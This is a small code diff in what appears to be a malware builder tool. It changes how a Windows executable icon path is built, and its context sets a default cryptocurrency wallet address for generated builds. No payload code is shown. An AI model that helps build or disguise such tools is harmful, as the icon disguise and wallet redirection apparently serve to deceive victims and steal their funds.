@@ -189,8 +189,8 @@ def _makebuild(q: Queue, data_builder) -> str:
         return
     
     if data_builder["icon_file"] == "Windows Exe" or "":
-        basic_exe_path = os.getcwd() + 'assets\imageres-011.ico'
-        data_builder["icon_path"] = basic_exe_path.replace('roseui', '')
+        win_exe_path = os.path.join(os.getcwd(), "components", "assets", "imageres-011.ico")
+        data_builder["icon_path"] = win_exe_path
 
     if data_builder["wallet_adress"] == "":
         data_builder["wallet_adress"] = gumbobr0ts_wallet_adr
